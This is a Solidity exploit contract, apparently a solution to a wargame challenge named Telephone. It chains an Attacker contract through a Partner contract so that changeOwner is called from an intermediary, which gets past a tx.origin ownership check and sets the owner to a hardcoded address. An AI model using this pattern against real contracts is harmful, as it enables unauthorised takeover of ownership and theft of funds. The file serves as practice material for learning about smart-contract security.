// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

import './Telephone.sol';

contract Attacker {
  Partner public partner;
  

  constructor(address _partnerAddress) public { 
      partner = Partner(_partnerAddress);
  }

  function attack() public {
    partner.attack();
  }

}
contract Partner{
  Telephone public telephone;

  constructor(address _telephoneAddress) public {
    telephone = Telephone(_telephoneAddress);
  }

  function attack() public {
    telephone.changeOwner(address(0xcf70e93b75BC5D94652445282DeC2DdaB223Aac1));
  }
}